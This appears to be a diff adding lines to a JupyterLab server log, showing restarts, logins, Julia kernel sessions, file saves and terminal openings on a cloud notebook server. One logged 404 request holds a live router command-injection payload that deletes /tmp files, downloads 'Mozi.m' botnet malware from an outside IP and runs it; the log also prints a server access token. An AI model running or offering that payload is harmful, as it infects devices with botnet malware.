@@ -1167,3 +1167,112 @@ Websocket closed
 [I 11:45:07.953 LabApp] 302 GET / (201.94.218.98) 0.57ms
 [I 11:50:55.743 LabApp] 302 GET / (80.82.68.60) 0.61ms
 [I 11:50:56.001 LabApp] 302 GET /lab (80.82.68.60) 0.72ms
+[W 12:45:09.817 LabApp] JupyterLab server extension not enabled, manually loading...
+[I 12:45:10.836 LabApp] JupyterLab extension loaded from /home/bohachu/.local/lib/python3.7/site-packages/jupyterlab
+[I 12:45:10.836 LabApp] JupyterLab application directory is /home/bohachu/.local/share/jupyter/lab
+[I 12:45:10.839 LabApp] Serving notebooks from local directory: /home/bohachu/cameo_motion
+[I 12:45:10.839 LabApp] Jupyter Notebook 6.1.4 is running at:
+[I 12:45:10.839 LabApp] http://cameo-motion-3:8080/?token=0a3595e410dd3c0763bb059f061efb3ccad321b838d54175
+[I 12:45:10.839 LabApp]  or http://127.0.0.1:8080/?token=0a3595e410dd3c0763bb059f061efb3ccad321b838d54175
+[I 12:45:10.839 LabApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[W 12:45:10.843 LabApp] No web browser found: could not locate runnable browser.
+[C 12:45:10.844 LabApp] 
+    
+    To access the notebook, open this file in a browser:
+        file:///home/bohachu/.local/share/jupyter/runtime/nbserver-11925-open.html
+    Or copy and paste one of these URLs:
+        http://cameo-motion-3:8080/?token=0a3595e410dd3c0763bb059f061efb3ccad321b838d54175
+     or http://127.0.0.1:8080/?token=0a3595e410dd3c0763bb059f061efb3ccad321b838d54175
+[I 12:45:57.649 LabApp] 302 GET / (111.240.171.238) 2.19ms
+[W 12:45:57.678 LabApp] Clearing invalid/expired login cookie username-104-155-201-144-8080
+[W 12:45:57.679 LabApp] Clearing invalid/expired login cookie username-104-155-201-144-8080
+[I 12:45:57.679 LabApp] 302 GET /lab? (111.240.171.238) 2.37ms
+[I 12:46:05.239 LabApp] Wrote hashed password to /home/bohachu/.jupyter/jupyter_notebook_config.json
+[I 12:46:05.239 LabApp] 302 POST /login?next=%2Flab%3F (111.240.171.238) 308.98ms
+[I 12:46:09.570 LabApp] Build is up to date
+-\|/-\|/-\|/-\|/-\|/-\|/-\|[I 12:46:13.921 LabApp] Creating new notebook in 
+/[I 12:46:13.967 LabApp] Writing notebook-signing key to /home/bohachu/.local/share/jupyter/notebook_secret
+-\|/-\[I 12:46:14.695 LabApp] Kernel started: 64539246-40bf-4e88-a928-784b3021ceff, name: julia-1.5
+|/-\|/-\|/[I 12:46:23.837 LabApp] Adapting from protocol version 5.0 (kernel 64539246-40bf-4e88-a928-784b3021ceff) to 5.3 (client).
+[I 12:46:24.098 LabApp] Adapting from protocol version 5.0 (kernel 64539246-40bf-4e88-a928-784b3021ceff) to 5.3 (client).
+[I 12:46:24.184 LabApp] Adapting from protocol version 5.0 (kernel 64539246-40bf-4e88-a928-784b3021ceff) to 5.3 (client).
+[I 12:48:14.457 LabApp] Saving file at /Untitled2.ipynb
+[W 12:53:36.694 LabApp] JupyterLab server extension not enabled, manually loading...
+[I 12:53:37.788 LabApp] JupyterLab extension loaded from /home/bohachu/.local/lib/python3.7/site-packages/jupyterlab
+[I 12:53:37.789 LabApp] JupyterLab application directory is /home/bohachu/.local/share/jupyter/lab
+[I 12:53:37.792 LabApp] Serving notebooks from local directory: /home/bohachu/cameo_motion
+[I 12:53:37.792 LabApp] Jupyter Notebook 6.1.4 is running at:
+[I 12:53:37.792 LabApp] http://cameo-motion-3:8080/
+[I 12:53:37.792 LabApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[W 12:53:37.800 LabApp] No web browser found: could not locate runnable browser.
+[W 12:53:37.966 LabApp] Clearing invalid/expired login cookie username-104-155-201-144-8080
+[W 12:53:37.967 LabApp] Clearing invalid/expired login cookie username-104-155-201-144-8080
+[I 12:53:37.967 LabApp] 302 GET /lab? (111.240.171.238) 2.59ms
+[I 12:53:41.093 LabApp] 302 POST /login?next=%2Flab%3F (111.240.171.238) 251.34ms
+[I 12:53:45.122 LabApp] Build is up to date
+[I 12:53:46.816 LabApp] Kernel started: efd43d86-8124-4665-9c98-4a251abd7c83, name: julia-1.5
+-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|[I 12:53:59.697 LabApp] Adapting from protocol version 5.0 (kernel efd43d86-8124-4665-9c98-4a251abd7c83) to 5.3 (client).
+[I 12:53:59.975 LabApp] Starting buffering for efd43d86-8124-4665-9c98-4a251abd7c83:8ad0ed57-9920-40d9-bca0-8f8b97821502
+[I 12:53:59.979 LabApp] Adapting from protocol version 5.0 (kernel efd43d86-8124-4665-9c98-4a251abd7c83) to 5.3 (client).
+[I 12:54:00.036 LabApp] Adapting from protocol version 5.0 (kernel efd43d86-8124-4665-9c98-4a251abd7c83) to 5.3 (client).
+[W 12:56:51.252 LabApp] 404 GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.48.198.223:36088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 (115.48.198.223) 25.12ms referer=None
+[I 13:07:17.732 LabApp] 302 GET / (80.41.65.75) 0.82ms
+[I 13:09:13.488 LabApp] Saving file at /install.sh
+[I 13:10:16.341 LabApp] Saving file at /install.sh
+[W 13:10:46.036 LabApp] JupyterLab server extension not enabled, manually loading...
+[I 13:10:47.152 LabApp] JupyterLab extension loaded from /home/bohachu/.local/lib/python3.7/site-packages/jupyterlab
+[I 13:10:47.153 LabApp] JupyterLab application directory is /home/bohachu/.local/share/jupyter/lab
+[I 13:10:47.159 LabApp] Serving notebooks from local directory: /home/bohachu/cameo_motion
+[I 13:10:47.159 LabApp] Jupyter Notebook 6.1.4 is running at:
+[I 13:10:47.159 LabApp] http://cameo-motion-3:8080/
+[I 13:10:47.159 LabApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[W 13:10:47.192 LabApp] No web browser found: could not locate runnable browser.
+[I 13:10:52.472 LabApp] Build is up to date
+[I 13:10:53.244 LabApp] Kernel started: 01cf00af-2279-43aa-888b-0b9214bc26d2, name: julia-1.5
+-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/-\|/[I 13:11:07.053 LabApp] Adapting from protocol version 5.0 (kernel 01cf00af-2279-43aa-888b-0b9214bc26d2) to 5.3 (client).
+[I 13:11:07.112 LabApp] Adapting from protocol version 5.0 (kernel 01cf00af-2279-43aa-888b-0b9214bc26d2) to 5.3 (client).
+[I 13:11:07.173 LabApp] Adapting from protocol version 5.0 (kernel 01cf00af-2279-43aa-888b-0b9214bc26d2) to 5.3 (client).
+[I 13:11:11.440 LabApp] Creating new notebook in 
+[I 13:11:11.683 LabApp] Kernel started: cb43abc5-0185-4329-8883-a10c9bee7c31, name: julia-1.5
+[I 13:11:20.286 LabApp] Adapting from protocol version 5.0 (kernel cb43abc5-0185-4329-8883-a10c9bee7c31) to 5.3 (client).
+[I 13:12:43.937 LabApp] Saving file at /install.sh
+[I 13:12:56.150 LabApp] Saving file at /Untitled3.ipynb
+[I 13:12:56.643 LabApp] Kernel started: f8bbe7e9-b48d-4c4b-9473-1532919e5dd7, name: julia-1.5
+[I 13:13:21.976 LabApp] Adapting from protocol version 5.0 (kernel f8bbe7e9-b48d-4c4b-9473-1532919e5dd7) to 5.3 (client).
+[I 13:13:35.752 LabApp] Starting buffering for f8bbe7e9-b48d-4c4b-9473-1532919e5dd7:18a84b77-81e6-4846-ba90-f1f7f506d93a
+[I 13:14:01.534 LabApp] Saving file at /Untitled3.ipynb
+[I 13:16:01.867 LabApp] Saving file at /Untitled3.ipynb
+[I 13:18:02.048 LabApp] Saving file at /Untitled3.ipynb
+[I 13:20:03.919 LabApp] Saving file at /Untitled3.ipynb
+[I 13:22:04.137 LabApp] Saving file at /Untitled3.ipynb
+[I 13:23:58.271 LabApp] New terminal with automatic name: 1
+TermSocket.open: 1
+TermSocket.open: Opened 1
+[I 13:24:04.439 LabApp] Saving file at /Untitled3.ipynb
+[I 13:26:04.761 LabApp] Saving file at /Untitled3.ipynb
+[I 13:28:05.373 LabApp] Saving file at /Untitled3.ipynb
+[I 13:30:06.012 LabApp] Saving file at /Untitled3.ipynb
+[I 13:32:07.246 LabApp] Saving file at /Untitled3.ipynb
+[I 13:34:08.237 LabApp] Saving file at /Untitled3.ipynb
+[I 13:34:54.144 LabApp] Uploading file to /截圖 2020-11-05 下午9.34.44.png
+[W 13:35:16.108 LabApp] 404 GET /a.png (111.240.171.238) 335.47ms referer=http://104.155.201.144:8080/lab?
+[I 13:35:25.982 LabApp] Saving file at /Untitled3.ipynb
+[I 13:37:26.540 LabApp] Saving file at /Untitled3.ipynb
+[I 13:37:48.598 LabApp] Saving file at /Untitled3.ipynb
+[W 13:38:03.389 LabApp] Notebook test_interact/Untitled.ipynb is not trusted
+[I 13:38:03.753 LabApp] Kernel started: 2d668ef8-cda8-4726-9e01-10f3ad8946c3, name: julia-1.5
+[I 13:38:08.123 LabApp] Kernel shutdown: 2d668ef8-cda8-4726-9e01-10f3ad8946c3
+Starting kernel event loops.
+[I 13:38:12.940 LabApp] Adapting from protocol version 5.0 (kernel 2d668ef8-cda8-4726-9e01-10f3ad8946c3) to 5.3 (client).
+[E 13:38:12.944 LabApp] Error opening stream: HTTP 404: Not Found (Kernel does not exist: 2d668ef8-cda8-4726-9e01-10f3ad8946c3)
+[W 13:38:12.951 LabApp] Notebook test_interact/test_interact.ipynb is not trusted
+[W 13:38:13.261 LabApp] delete /test_interact/Untitled.ipynb
+[I 13:38:13.584 LabApp] Kernel started: 798877f0-65b7-4660-8d0e-6bac3ca2770f, name: julia-1.5
+[I 13:38:19.531 LabApp] Kernel shutdown: 798877f0-65b7-4660-8d0e-6bac3ca2770f
+Starting kernel event loops.
+[I 13:38:22.442 LabApp] Adapting from protocol version 5.0 (kernel 798877f0-65b7-4660-8d0e-6bac3ca2770f) to 5.3 (client).
+[E 13:38:22.444 LabApp] Error opening stream: HTTP 404: Not Found (Kernel does not exist: 798877f0-65b7-4660-8d0e-6bac3ca2770f)
+[W 13:38:22.669 LabApp] delete /test_interact/test_interact.ipynb
+[I 13:41:56.442 LabApp] New terminal with automatic name: 2
+TermSocket.open: 2
+TermSocket.open: Opened 2
